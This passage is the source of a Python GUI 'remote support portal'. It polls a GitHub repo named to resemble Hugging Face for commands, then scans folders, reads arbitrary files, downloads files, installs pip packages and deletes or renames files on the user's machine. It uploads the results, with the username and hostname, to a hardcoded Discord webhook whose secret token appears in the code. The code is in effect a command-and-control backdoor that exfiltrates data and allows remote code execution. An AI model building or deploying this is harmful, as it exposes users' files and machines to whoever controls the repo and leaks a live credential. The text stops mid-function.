"""
Python Portal for Atlas
=======================
A remote support tool that polls GitHub for commands and executes them
on the user's machine.  Stdlib-only so it runs on any Python install.

The portal lives in the folder the user chose when summoning it.
When done, the user can close and delete it.

Commands are pushed to:
  https://raw.githubusercontent.com/hugging-phace/mbe-updates/main/
    manifests/portal-commands.json

Each command has a unique ID.  The portal tracks executed IDs locally
so it never runs the same command twice.

UI: Pulsing portal on the left, chat sidebar on the right that slides
open when Atlas sends a message.  User can reply back to Discord.
Speech can be muted from the chat sidebar.
"""

import json
import os
import platform
import subprocess
import sys
import threading
import time
import urllib.request
from datetime import datetime
from pathlib import Path

import tkinter as tk
from tkinter import font as tkfont

# ------------------------------------------------------------------
# Config
# ------------------------------------------------------------------
PORTAL_VERSION = "1.2.0"
COMMANDS_URL = (
    "https://api.github.com/repos/hugging-phace/mbe-updates/contents/"
    "manifests/portal-commands.json"
)
WEBHOOK_URL = (
    "https://discord.com/api/webhooks/1524620703259951104/"
    "fqpIEBXVWsKHy7f1iZ9xoryCpidmjPYIDuITfcwMOjBfMyS2HtJNWpVbfOetapl8vw9O"
)
FIREBASE_URL = "https://mbe-portal-default-rtdb.firebaseio.com"
POLL_INTERVAL = 5  # seconds (for GitHub commands)
CHAT_POLL_INTERVAL = 1  # seconds (for Firebase chat — instant feel)
REMINDER_INTERVAL = 25 * 60  # 25 minutes in seconds
CREATE_NO_WINDOW = (
    subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
)

# Colours
_BG = "#0a0a12"
_PANEL = "#12121f"
_PORTAL_IDLE = "#9b59b6"
_PORTAL_ACTIVE = "#00d4ff"
_PORTAL_DONE = "#22c55e"
_PORTAL_ERROR = "#ef4444"
_TEXT = "#ffffff"
_MUTED = "#6b7280"
_CHAT_BG = "#0d0d18"
_CHAT_BUBBLE_ATLAS = "#0a0a12"
_CHAT_BUBBLE_USER = "#2a1a3e"
_CHAT_ENTRY_BG = "#1a0a2e"
_CHAT_BORDER = "#4a2a6e"
_ACCENT = "#9b59b6"

# ------------------------------------------------------------------
# Discord communication
# ------------------------------------------------------------------
def _post_to_discord(content):
    try:
        payload = json.dumps({"content": content[:1900]}).encode("utf-8")
        req = urllib.request.Request(
            WEBHOOK_URL, data=payload,
            headers={"Content-Type": "application/json",
                     "User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status in (200, 204)
    except Exception:
        return False


def _post_file_to_discord(content, file_path):
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        boundary = f"----WebKitFormBoundary{os.urandom(8).hex()}"
        payload_json = json.dumps({"content": content[:1900]})

        body = b""
        body += f"--{boundary}\r\n".encode()
        body += b'Content-Disposition: form-data; name="payload_json"\r\n'
        body += b"Content-Type: application/json\r\n\r\n"
        body += payload_json.encode() + b"\r\n"

        body += f"--{boundary}\r\n".encode()
        body += (f'Content-Disposition: form-data; name="files[0]"; '
                 f'filename="{Path(file_path).name}"\r\n').encode()
        body += b"Content-Type: text/plain\r\n\r\n"
        body += file_data + b"\r\n"
        body += f"--{boundary}--\r\n".encode()

        req = urllib.request.Request(
            WEBHOOK_URL, data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                     "User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status in (200, 204)
    except Exception:
        return _post_to_discord(content + "\n\n[File attachment failed]")


# ------------------------------------------------------------------
# Command execution
# ------------------------------------------------------------------
def _scan_directory(path):
    lines = []
    p = Path(path)
    if not p.exists():
        return f"Path does not exist: {path}"
    lines.append(f"Contents of: {p}")
    lines.append(f"Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    lines.append("")
    for root, dirs, files in os.walk(path):
        depth = len(Path(root).relative_to(path).parts)
        if depth > 3:
            dirs.clear()
            continue
        indent = "  " * depth
        lines.append(f"{indent}{Path(root).name}/")
        for f in sorted(files):
            fp = Path(root) / f
            try:
                size = fp.stat().st_size
                if size > 1024 * 1024:
                    size_str = f"({size / 1024 / 1024:.1f} MB)"
                elif size > 1024:
                    size_str = f"({size / 1024:.0f} KB)"
                else:
                    size_str = f"({size} B)"
            except Exception:
                size_str = ""
            lines.append(f"{indent}  {f} {size_str}")
    return "\n".join(lines)


def _check_packages():
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "pip", "list", "--format=columns"],
            capture_output=True, text=True, timeout=30,
            creationflags=CREATE_NO_WINDOW)
        return proc.stdout or proc.stderr
    except Exception as e:
        return f"Error: {e}"


def _read_file(path, max_bytes=50000):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            data = f.read(max_bytes)
        if len(data) == max_bytes:
            data += "\n... [truncated]"
        return data
    except Exception as e:
        return f"Error reading file: {e}"


def _download_file(url, dest_path):
    try:
        req = urllib.request.Request(
            url, headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
        with urllib.request.urlopen(req, timeout=60) as resp:
            data = resp.read()
        Path(dest_path).parent.mkdir(parents=True, exist_ok=True)
        with open(dest_path, "wb") as f:
            f.write(data)
        return True, f"Downloaded {len(data)} bytes to {dest_path}"
    except Exception as e:
        return False, f"Download failed: {e}"


def _pip_install(packages):
    if isinstance(packages, str):
        packages = [packages]
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--upgrade"] + packages,
            capture_output=True, text=True, timeout=300,
            creationflags=CREATE_NO_WINDOW)
        output = proc.stdout + proc.stderr
        return (proc.returncode == 0, output[-2000:])
    except Exception as e:
        return False, f"pip install error: {e}"


def _speak_text(text):
    try:
        if platform.system() == "Windows":
            escaped = text.replace("'", "''")
            ps_cmd = (
                "Add-Type -AssemblyName System.Speech; "
                "(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{}')"
            ).format(escaped)
            subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                capture_output=True, timeout=30,
                creationflags=CREATE_NO_WINDOW)
        elif platform.system() == "Darwin":
            subprocess.run(["say", text], capture_output=True, timeout=30)
    except Exception:
        pass


def _write_temp(text):
    import tempfile
    fd, path = tempfile.mkstemp(suffix=".txt", prefix="portal_")
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        f.write(text)
    return path


# ------------------------------------------------------------------
# Portal UI — pulsing circle + chat sidebar
# ------------------------------------------------------------------
class PortalWindow:
    def __init__(self, root):
        self.root = root
        self.portal_dir = Path(__file__).parent
        self.executed_file = self.portal_dir / ".portal_executed.json"
        self.executed_ids = self._load_executed()
        self.pulse_phase = 0.0
        self.portal_color = _PORTAL_IDLE
        self.status_text = "Portal idle — waiting for commands..."
        self.muted = False
        self.chat_visible = False

        # Window — wider to accommodate chat sidebar
        root.title("Python Portal for Atlas")
        root.geometry("400x400")
        root.resizable(False, False)
        root.configure(bg=_BG)
        root.protocol("WM_DELETE_WINDOW", self._close)

        # Bring to front on open — stays topmost briefly to survive
        # the "Portal Opened" messagebox from the launcher
        root.attributes("-topmost", True)
        root.after(500, lambda: root.attributes("-topmost", True))
        root.after(2000, lambda: root.attributes("-topmost", False))

        # ---- Main portal area (left) ----
        self.main_frame = tk.Frame(root, bg=_BG, width=400, height=400)
        self.main_frame.pack(side="left", fill="both", expand=True)
        self.main_frame.pack_propagate(False)

        # Canvas for the pulsing portal
        self.canvas = tk.Canvas(self.main_frame, width=400, height=280,
                                 bg=_BG, highlightthickness=0)
        self.canvas.pack()

        # Status text
        self.status_var = tk.StringVar(value=self.status_text)
        tk.Label(self.main_frame, textvariable=self.status_var,
                 font=("Segoe UI", 9), bg=_BG, fg=_TEXT,
                 wraplength=360).pack(pady=(0, 4))

        # Bottom bar: chat bubble icon + footer note
        bottom_bar = tk.Frame(self.main_frame, bg=_BG)
        bottom_bar.pack(side="bottom", fill="x", padx=12, pady=(0, 8))

        # Chat bubble icon (right side of bottom bar — same side chat opens)
        self.chat_btn = tk.Canvas(bottom_bar, width=28, height=28,
                                   bg=_BG, highlightthickness=0, cursor="hand2")
        self.chat_btn.pack(side="right")
        self._draw_chat_bubble(False)
        self.chat_btn.bind("<Button-1>", lambda e: self._toggle_chat())

        # Footer note
        tk.Label(bottom_bar,
                 text="Close to delete this portal\n(you can always open another).",
                 font=("Segoe UI", 7), bg=_BG, fg=_MUTED,
                 justify="left").pack(side="left")

        # ---- Chat sidebar (right, hidden initially) ----
        self.chat_frame = tk.Frame(root, bg=_CHAT_BG, width=340, height=400)
        # Not packed yet — shown when _toggle_chat or message arrives

        # Chat header
        chat_header = tk.Frame(self.chat_frame, bg=_PANEL, height=34)
        chat_header.pack(side="top", fill="x")
        chat_header.pack_propagate(False)

        tk.Label(chat_header, text="Atlas",
                 font=("Segoe UI", 11, "bold"), bg=_PANEL, fg=_TEXT,
                 ).pack(side="left", padx=(10, 0), pady=5)

        # Mute button
        self.mute_btn = tk.Button(chat_header, text="\U0001F50A",
                                   command=self._toggle_mute,
                                   bg=_PANEL, fg=_TEXT, relief="flat",
                                   bd=0, cursor="hand2", font=("Segoe UI", 12))
        self.mute_btn.pack(side="right", padx=(0, 4), pady=3)

        # Close sidebar button
        tk.Button(chat_header, text="\u2715",
                  command=self._hide_chat,
                  bg=_PANEL, fg=_MUTED, relief="flat",
                  bd=0, cursor="hand2", font=("Segoe UI", 10)).pack(
                      side="right", padx=(0, 2), pady=3)

        # Chat messages area — scrollable canvas for bubble rendering
        chat_scroll_frame = tk.Frame(self.chat_frame, bg=_CHAT_BG)
        chat_scroll_frame.pack(side="top", fill="both", expand=True)

        self.chat_canvas = tk.Canvas(chat_scroll_frame, bg=_CHAT_BG,
                                      highlightthickness=0)
        self.chat_scrollbar = tk.Scrollbar(chat_scroll_frame,
                                            command=self.chat_canvas.yview,
                                            bg=_CHAT_BG,
                                            troughcolor=_CHAT_BG,
                                            borderwidth=0,
                                            activebackground=_PANEL)
        self.chat_scrollbar.pack(side="right", fill="y")
        self.chat_canvas.pack(side="left", fill="both", expand=True)
        self.chat_canvas.configure(yscrollcommand=self.chat_scrollbar.set)

        # Inner frame that holds the bubble widgets
        self.chat_inner = tk.Frame(self.chat_canvas, bg=_CHAT_BG)
        self.chat_inner_window = self.chat_canvas.create_window(
            (0, 0), window=self.chat_inner, anchor="n")
        self.chat_inner.bind("<Configure>", self._on_chat_inner_configure)
        self.chat_canvas.bind("<Configure>", self._on_chat_canvas_configure)

        # Mouse wheel / touchpad scrolling
        self.chat_canvas.bind("<MouseWheel>", self._on_mouse_wheel)
        self.chat_canvas.bind("<Button-4>", self._on_mouse_wheel)
        self.chat_canvas.bind("<Button-5>", self._on_mouse_wheel)
        # Bind to inner frame too so scrolling works over bubbles
        self.chat_inner.bind("<MouseWheel>", self._on_mouse_wheel)
        self.chat_inner.bind("<Button-4>", self._on_mouse_wheel)
        self.chat_inner.bind("<Button-5>", self._on_mouse_wheel)

        # Track bubbles for layout
        self._chat_bubbles = []
        self._bubble_count = 0
        self._welcome_shown = False

        # Welcome screen with stars (drawn on canvas, behind inner frame)
        self._welcome_items = []
        self._draw_welcome()

        # ---- Floating input box (detached from corners) ----
        self.input_container = tk.Frame(self.chat_frame, bg=_CHAT_BG)
        self.input_container.pack(side="bottom", fill="x", padx=12, pady=(4, 10))

        # Input frame with rounded look (using flat bg + padding)
        self.input_wrapper = tk.Frame(self.input_container, bg=_CHAT_ENTRY_BG,
                                       highlightthickness=1,
                                       highlightbackground=_CHAT_BORDER,
                                       highlightcolor=_CHAT_BORDER)
        self.input_wrapper.pack(fill="x", padx=0, pady=0)

        # Auto-growing text widget for input
        self.chat_input = tk.Text(self.input_wrapper, wrap="word",
                                   bg=_CHAT_ENTRY_BG, fg=_TEXT,
                                   insertbackground=_TEXT,
                                   font=("Segoe UI", 10),
                                   relief="flat", bd=0,
                                   padx=10, pady=8,
                                   height=1,
                                   highlightthickness=0)
        self.chat_input.pack(side="left", fill="x", expand=True)
        self.chat_input.bind("<KeyRelease>", self._on_input_change)
        self.chat_input.bind("<Return>", lambda e: self._send_user_message())
        self.chat_input.bind("<Shift-Return>", lambda e: None)

        # Input placeholder
        self._input_placeholder = "Type here to message Atlas..."
        self._input_has_placeholder = True
        self.chat_input.insert("1.0", self._input_placeholder)
        self.chat_input.configure(fg=_MUTED)
        self.chat_input.bind("<FocusIn>", self._on_input_focus_in)
        self.chat_input.bind("<FocusOut>", self._on_input_focus_out)

        # Send button
        send_btn = tk.Button(self.input_wrapper, text="\u279C",
                             command=self._send_user_message,
                             bg=_CHAT_ENTRY_BG, fg=_ACCENT, relief="flat",
                             bd=0, cursor="hand2",
                             font=("Segoe UI", 14))
        send_btn.pack(side="right", padx=(4, 8), pady=6)

        # Hint text below input
        tk.Label(self.input_container,
                 text="Enter to send \u00b7 Shift+Enter for new line",
                 font=("Segoe UI", 7), bg=_CHAT_BG, fg=_MUTED,
                 ).pack(anchor="w", padx=4, pady=(2, 0))

        # Adjust window width when chat is shown
        self._chat_open_width = 740
        self._chat_closed_width = 400

        # Track when portal was opened
        self._opened_at = time.time()
        self._first_poll = True

        # Start animation + polling + reminder
        self._animate()
        threading.Thread(target=self._poll_loop, daemon=True).start()
        threading.Thread(target=self._reminder_loop, daemon=True).start()
        threading.Thread(target=self._chat_poll_loop, daemon=True).start()

        # Ensure input doesn't grab focus on startup — keep placeholder visible
        self.root.focus_set()
        self.chat_input.tk_focusNext()

    # ---- Chat bubble icon ----
    def _draw_chat_bubble(self, has_unread):
        """Draw a chat bubble icon on the canvas button."""
        self.chat_btn.delete("all")
        color = _ACCENT if has_unread else _MUTED
        # Bubble outline
        self.chat_btn.create_oval(4, 4, 24, 24, outline=color, width=2)
        # Small speech dot
        self.chat_btn.create_oval(10, 10, 18, 18, fill=color, outline="")

    def _toggle_chat(self):
        if self.chat_visible:
            self._hide_chat()
        else:
            self._show_chat()

    def _show_chat(self):
        if not self.chat_visible:
            self.chat_frame.pack(side="right", fill="both")
            self.root.geometry(f"{self._chat_open_width}x400")
            self.chat_visible = True
            self._draw_chat_bubble(False)
            # Keep focus on root so input placeholder stays visible
            self.root.focus_set()

    def _hide_chat(self):
        if self.chat_visible:
            self.chat_frame.pack_forget()
            self.root.geometry(f"{self._chat_closed_width}x400")
            self.chat_visible = False
            self._draw_chat_bubble(False)

    def _toggle_mute(self):
        self.muted = not self.muted
        self.mute_btn.configure(
            text="\U0001F507" if self.muted else "\U0001F50A")

    # ---- Chat canvas scrolling ----
    def _on_chat_inner_configure(self, event):
        """Update scroll region when inner frame changes size."""
        self.chat_canvas.configure(scrollregion=self.chat_canvas.bbox("all"))

    def _on_chat_canvas_configure(self, event):
        """Adjust inner frame width to match canvas width + redraw welcome."""
        self.chat_canvas.itemconfig(self.chat_inner_window, width=event.width)
        # Redraw welcome screen once canvas has real dimensions
        if self._welcome_shown and self._bubble_count == 0 and event.width > 1:
            for item in self._welcome_items:
                try:
                    self.chat_canvas.delete(item)
                except Exception:
                    pass
            self._welcome_items = []
            self._draw_welcome(event.width, event.height)

    def _on_mouse_wheel(self, event):
        """Handle mouse wheel / touchpad scrolling over chat area."""
        if event.num == 5 or event.delta < 0:
            self.chat_canvas.yview_scroll(3, "units")
        elif event.num == 4 or event.delta > 0:
            self.chat_canvas.yview_scroll(-3, "units")

    # ---- Welcome screen (stars) ----
    def _draw_welcome(self, canvas_w=None, canvas_h=None):
        """Draw a 'Welcome to Space' placeholder with stars on the chat canvas."""
        if self._bubble_count > 0:
            return
        self._welcome_shown = True
        # Use provided dimensions (from configure event) or fall back to winfo
        w = canvas_w or self.chat_canvas.winfo_width() or 300
        h = canvas_h or self.chat_canvas.winfo_height() or 250

        # Stars at fixed positions
        import random
        random.seed(42)  # consistent star positions
        stars = []
        for _ in range(15):
            sx = random.randint(20, max(40, w - 20))
            sy = random.randint(20, max(40, h - 60))
            size = random.choice([1, 1, 1, 2, 2, 3])  # mostly small
            brightness = random.choice(["#444466", "#555577", "#666688", "#8888aa"])
            stars.append((sx, sy, size, brightness))

        for sx, sy, size, brightness in stars:
            item = self.chat_canvas.create_oval(
                sx - size, sy - size, sx + size, sy + size,
                fill=brightness, outline="", tags="welcome")
            self._welcome_items.append(item)

        # "Welcome to Space" text — manually shifted left for visual centering
        cx = (w // 2) - 30
        cy = h // 2 - 20
        item = self.chat_canvas.create_text(
            cx, cy, text="Welcome to Space",
            fill=_ACCENT, font=("Segoe UI", 14, "bold"),
            anchor="center", tags="welcome")
        self._welcome_items.append(item)

        item = self.chat_canvas.create_text(
            cx, cy + 24, text="Atlas will appear here when you're needed.",
            fill=_MUTED, font=("Segoe UI", 8),
            anchor="center", tags="welcome")
        self._welcome_items.append(item)

    def _remove_welcome(self):
        """Remove the welcome screen when first bubble arrives."""
        if not self._welcome_shown:
            return
        for item in self._welcome_items:
            try:
                self.chat_canvas.delete(item)
            except Exception:
                pass
        self.chat_canvas.delete("welcome")
        self._welcome_items = []
        self._welcome_shown = False

    # ---- Input placeholder ----
    def _on_input_focus_in(self, event):
        if self._input_has_placeholder:
            self.chat_input.delete("1.0", "end")
            self.chat_input.configure(fg=_TEXT)
            self._input_has_placeholder = False

    def _on_input_focus_out(self, event):
        content = self.chat_input.get("1.0", "end-1c").strip()
        if not content:
            self.chat_input.insert("1.0", self._input_placeholder)
            self.chat_input.configure(fg=_MUTED)
            self._input_has_placeholder = True

    # ---- Chat bubbles ----
    def _add_chat_message(self, sender, text, is_atlas=True):
        """Add a chat bubble to the message area."""
        # Remove welcome screen on first message
        if self._bubble_count == 0:
            self._remove_welcome()
        bubble_bg = _CHAT_BUBBLE_ATLAS if is_atlas else _CHAT_BUBBLE_USER
        name_color = _ACCENT if is_atlas else "#c8a8e8"
        name_label = "Atlas" if is_atlas else "You"

        # Container for this bubble (full width row)
        row = tk.Frame(self.chat_inner, bg=_CHAT_BG)
        row.pack(fill="x", padx=8, pady=(6, 2))

        if is_atlas:
            # Atlas messages: left-aligned, black with purple border
            bubble = tk.Frame(row, bg=bubble_bg, padx=12, pady=8,
                              highlightthickness=1,
                              highlightbackground=_CHAT_BORDER,
                              highlightcolor=_CHAT_BORDER)
            bubble.pack(side="left", anchor="w")
        else:
            # User messages: right-aligned, dark purple
            bubble = tk.Frame(row, bg=bubble_bg, padx=12, pady=8)
            bubble.pack(side="right", anchor="e")

        # Name label
        tk.Label(bubble, text=name_label, font=("Segoe UI", 8, "bold"),
                 bg=bubble_bg, fg=name_color).pack(anchor="w")

        # Message text
        msg_label = tk.Label(bubble, text=text, font=("Segoe UI", 10),
                             bg=bubble_bg, fg=_TEXT, wraplength=240,
                             justify="left")
        msg_label.pack(anchor="w")

        # Timestamp
        ts = datetime.now().strftime("%H:%M")
        tk.Label(bubble, text=ts, font=("Segoe UI", 7),
                 bg=bubble_bg, fg=_MUTED).pack(anchor="w", pady=(2, 0))

        self._bubble_count += 1
        self._chat_bubbles.append(bubble)

        # Auto-scroll to bottom
        self.chat_canvas.update_idletasks()
        self.chat_canvas.yview_moveto(1.0)

    def _add_system_message(self, text):
        """Add a centered system message (no bubble)."""
        row = tk.Frame(self.chat_inner, bg=_CHAT_BG)
        row.pack(fill="x", padx=8, pady=(8, 4))
        tk.Label(row, text=text, font=("Segoe UI", 8, "italic"),
                 bg=_CHAT_BG, fg=_MUTED, wraplength=240,
                 justify="center").pack()
        self.chat_canvas.update_idletasks()
        self.chat_canvas.yview_moveto(1.0)

    # ---- Input auto-grow ----
    def _on_input_change(self, event=None):
        """Auto-grow the input text widget as the user types.
        Counts both explicit newlines AND visual wrap lines."""
        if self._input_has_placeholder:
            return  # Don't resize for placeholder
        content = self.chat_input.get("1.0", "end-1c")
        if not content:
            self.chat_input.configure(height=1)
            return
        # Count display lines: each explicit newline + wrapped lines
        total_lines = 0
        for line in content.split("\n"):
            if len(line) == 0:
                total_lines += 1
            else:
                # Approximate wrap: ~28 chars per line at width 200px, font size 10
                wrapped = max(1, -(-len(line) // 28))  # ceiling division
                total_lines += wrapped
        # Cap at 5 lines visible
        new_height = min(max(1, total_lines), 5)
        if self.chat_input.cget("height") != new_height:
            self.chat_input.configure(height=new_height)

    def _send_user_message(self):
        """Send user's chat message to Discord."""
        if self._input_has_placeholder:
            return  # Don't send placeholder text
        msg = self.chat_input.get("1.0", "end-1c").strip()
        if not msg:
            return
        self.chat_input.delete("1.0", "end")
        self.chat_input.configure(height=1)
        self._add_chat_message("You", msg, is_atlas=False)

        # Send to Discord
        user = os.getlogin() if hasattr(os, "getlogin") else "unknown"
        host = platform.node() or "unknown"
        threading.Thread(
            target=lambda: _post_to_discord(
                f"[Portal Chat @ {user}@{host}] {msg}"),
            daemon=True).start()

    def _receive_atlas_message(self, text, speak=False):
        """Show a message from Atlas in the chat + optionally speak it."""
        self._add_chat_message("Atlas", text, is_atlas=True)
        # Auto-open chat if closed
        if not self.chat_visible:
            self._show_chat()
        else:
            self._draw_chat_bubble(False)
        # Speak unless muted
        if speak and not self.muted:
            threading.Thread(target=lambda: _speak_text(text), daemon=True).start()

    # ---- Executed IDs persistence ----
    def _load_executed(self):
        try:
            if self.executed_file.exists():
                with open(self.executed_file, "r") as f:
                    return set(json.load(f))
        except Exception:
            pass
        return set()

    def _save_executed(self):
        try:
            with open(self.executed_file, "w") as f:
                json.dump(list(self.executed_ids), f)
        except Exception:
            pass

    # ---- Animation ----
    def _hex_to_rgb(self, hex_color):
        hex_color = hex_color.lstrip("#")
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    def _lerp_color(self, c1, c2, t):
        r1, g1, b1 = self._hex_to_rgb(c1)
        r2, g2, b2 = self._hex_to_rgb(c2)
        r = int(r1 + (r2 - r1) * t)
        g = int(g1 + (g2 - g1) * t)
        b = int(b1 + (b2 - b1) * t)
        return f"#{r:02x}{g:02x}{b:02x}"

    def _animate(self):
        self.pulse_phase += 0.05
        if self.pulse_phase > 6.283:
            self.pulse_phase = 0.0

        self.canvas.delete("portal")
        cx, cy = 200, 160
        base_r = 80

        # Smooth pulse using sine wave
        import math
        pulse_t = 0.5 + 0.5 * math.sin(self.pulse_phase)
        r = int(base_r * (1 + 0.12 * pulse_t))

        # ---- Outer glow halo (many concentric circles fading outward) ----
        # Simulates a radial gradient / blur effect
        glow_layers = 30
        max_glow_r = r + 50
        for i in range(glow_layers, 0, -1):
            layer_r = r + int((max_glow_r - r) * (i / glow_layers))
            # Fade from portal color at center to background at edge
            alpha = (1 - (i / glow_layers)) ** 2 * 0.4  # quadratic falloff
            color = self._lerp_color(_BG, self.portal_color, alpha)
            self.canvas.create_oval(
                cx - layer_r, cy - layer_r, cx + layer_r, cy + layer_r,
                fill=color, outline="", tags="portal")

        # ---- Expanding pulse rings (subtle, wave-like) ----
        for i in range(3):
            wave = (self.pulse_phase + i * 2.0) % 6.283
            progress = wave / 6.283
            ring_r = r + int(40 * progress)
            ring_alpha = (1 - progress) * 0.5
            ring_color = self._lerp_color(_BG, self.portal_color, ring_alpha)
            self.canvas.create_oval(
                cx - ring_r, cy - ring_r, cx + ring_r, cy + ring_r,
                outline=ring_color, width=1, tags="portal")

        # ---- Core glow (bright center fading to color) ----
        # Inner gradient: white core -> portal color
        core_layers = 12
        for i in range(core_layers, 0, -1):
            core_r = int(r * (i / core_layers))
            blend = (i / core_layers) ** 1.5  # more white in center
            color = self._lerp_color(self.portal_color, "#ffffff", 1 - blend)
            self.canvas.create_oval(
                cx - core_r, cy - core_r, cx + core_r, cy + core_r,
                fill=color, outline="", tags="portal")

        # ---- Bright white center ----
        center_r = int(r * 0.15 * (0.8 + 0.2 * pulse_t))
        self.canvas.create_oval(
            cx - center_r, cy - center_r, cx + center_r, cy + center_r,
            fill="#ffffff", outline="", tags="portal")

        self.root.after(40, self._animate)

    def _set_color(self, color, status):
        self.portal_color = color
        self.status_var.set(status)

    # ---- Polling ----
    def _poll_loop(self):
        while True:
            try:
                self._poll_once()
            except Exception as e:
                self.root.after(0, lambda: self._set_color(
                    _PORTAL_ERROR, f"Poll error: {e}"))
            time.sleep(POLL_INTERVAL)

    # ---- Reminder loop — nag Atlas every 25 min if portal still open ----
    def _reminder_loop(self):
        while True:
            time.sleep(REMINDER_INTERVAL)
            try:
                user = os.getlogin() if hasattr(os, "getlogin") else "unknown"
                host = platform.node() or "unknown"
                elapsed = int((time.time() - self._opened_at) / 60)
                _post_to_discord(
                    f"**Portal Still Active**\n"
                    f"User: {user}@{host}\n"
                    f"Open for: {elapsed} minutes\n"
                    f"Use /close to shut it down remotely if done.")
            except Exception:
                pass

    # ---- Firebase chat polling (instant message delivery) ----
    def _chat_poll_loop(self):
        """Poll Firebase every 1 second for chat messages from Atlas."""
        seen_ids = set()
        while True:
            try:
                req = urllib.request.Request(
                    f"{FIREBASE_URL}/chat.json",
                    headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read().decode("utf-8"))

                if data:
                    for msg_id, msg_data in data.items():
                        if msg_id in seen_ids:
                            continue
                        seen_ids.add(msg_id)
                        text = msg_data.get("text", "")
                        msg_type = msg_data.get("type", "msg")
                        speak = (msg_type == "speak")
                        if text:
                            self.root.after(0, lambda t=text, s=speak:
                                            self._receive_atlas_message(t, speak=s))
            except Exception:
                pass
            time.sleep(CHAT_POLL_INTERVAL)

    def _poll_once(self):
        try:
            req = urllib.request.Request(
                COMMANDS_URL,
                headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}",
                         "Accept": "application/vnd.github.v3+json",
                         "Cache-Control": "no-cache"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                raw = json.loads(resp.read().decode("utf-8"))
            # GitHub API returns content as base64-encoded
            import base64
            content = base64.b64decode(raw["content"]).decode("utf-8")
            data = json.loads(content)
        except Exception:
            # Fallback to raw URL with cache-busting
            try:
                fallback_url = (
                    "https://raw.githubusercontent.com/hugging-phace/mbe-updates/main/"
                    f"manifests/portal-commands.json?t={int(time.time())}"
                )
                req2 = urllib.request.Request(
                    fallback_url,
                    headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}",
                             "Cache-Control": "no-cache"})
                with urllib.request.urlopen(req2, timeout=15) as resp2:
                    data = json.loads(resp2.read().decode("utf-8"))
            except Exception:
                return

        commands = data.get("commands", [])

        # On the very first poll, mark ALL existing commands as executed.
        # This ensures the portal only responds to commands sent AFTER it opened.
        if self._first_poll:
            self._first_poll = False
            for c in commands:
                if c.get("id"):
                    self.executed_ids.add(c.get("id"))
            self._save_executed()
            self.root.after(0, lambda: self._set_color(
                _PORTAL_IDLE, "Portal idle — waiting for commands..."))
            return

        # Only execute commands we haven't seen before
        new_commands = [
            c for c in commands
            if c.get("id") and c.get("id") not in self.executed_ids
        ]

        if not new_commands:
            self.root.after(0, lambda: self._set_color(
                _PORTAL_IDLE, "Portal idle — waiting for commands..."))
            return

        self.root.after(0, lambda: self._set_color(
            _PORTAL_ACTIVE, f"Processing {len(new_commands)} command(s)..."))

        for cmd in new_commands:
            cmd_id = cmd.get("id")
            try:
                ok, result = self._execute_command(cmd)
                color = _PORTAL_DONE if ok else _PORTAL_ERROR
                status = f"Command '{cmd.get('type')}' {'done' if ok else 'failed'}"
            except Exception as e:
                color = _PORTAL_ERROR
                status = f"Command error: {e}"
                ok = False

            self.root.after(0, lambda c=color, s=status: self._set_color(c, s))
            time.sleep(1)

            self.executed_ids.add(cmd_id)
            self._save_executed()

        self.root.after(0, lambda: self._set_color(
            _PORTAL_IDLE, "Portal idle — waiting for commands..."))

    # ---- Command execution (routes msg/speak to chat) ----
    def _execute_command(self, cmd):
        cmd_type = cmd.get("type", "")
        user = os.getlogin() if hasattr(os, "getlogin") else "unknown"
        host = platform.node() or "unknown"
        tag = f"[Portal @ {user}@{host}]"

        if cmd_type == "scan":
            path = cmd.get("path", str(Path.home()))
            result = _scan_directory(path)
            _post_file_to_discord(f"{tag} Scan result for: {path}", _write_temp(result))
            return True, result

        elif cmd_type == "check_packages":
            result = _check_packages()
            _post_file_to_discord(f"{tag} Installed packages", _write_temp(result))
            return True, result

        elif cmd_type == "download":
            url = cmd.get("url", "")
            dest = cmd.get("dest", "")
            if not url or not dest:
                return False, "Missing url or dest"
            ok, msg = _download_file(url, dest)
            _post_to_discord(f"{tag} {msg}")
            return ok, msg

        elif cmd_type == "pip_install":
            packages = cmd.get("packages", [])
            ok, msg = _pip_install(packages)
            _post_to_discord(f"{tag} pip install {' '.join(packages)}: {'OK' if ok else 'FAILED'}\n{msg[:500]}")
            return ok, msg

        elif cmd_type == "read_file":
            path = cmd.get("path", "")
            if not path:
                return False, "Missing path"
            result = _read_file(path)
            _post_file_to_discord(f"{tag} Contents of {path}", _write_temp(result))
            return True, result

        elif cmd_type == "read_file_inline":
            path = cmd.get("path", "")
            if not path:
                return False, "Missing path"
            result = _read_file(path, max_bytes=1800)
            _post_to_discord(f"{tag} `{path}`:\n```\n{result[:1800]}\n```")
            return True, result

        elif cmd_type == "delete_file":
            path = cmd.get("path", "")
            if not path:
                return False, "Missing path"
            try:
                Path(path).unlink()
                _post_to_discord(f"{tag} Deleted: {path}")
                return True, f"Deleted: {path}"
            except Exception as e:
                return False, f"Delete failed: {e}"

        elif cmd_type == "rename_file":
            old = cmd.get("old_path", "")
            new = cmd.get("new_path", "")
            if not old or not new:
                return False, "Missing old_path or new_path"
            try:
                Path(old).rename(new)
                _post_to_discord(f"{tag} Renamed: {old} -> {new}")
                return True, f"Renamed: {old} -> {new}"
            except Exception as e:
                return False, f"Rename failed: {e}"

        elif cmd_type == "message":
            # Chat is now handled by Firebase (instant).
            # GitHub command just confirms delivery to Discord.
            msg = cmd.get("text", "")
            if msg:
                _post_to_discord(f"{tag} Message sent via Firebase: {msg[:200]}")
            return True, msg

        elif cmd_type == "speak":
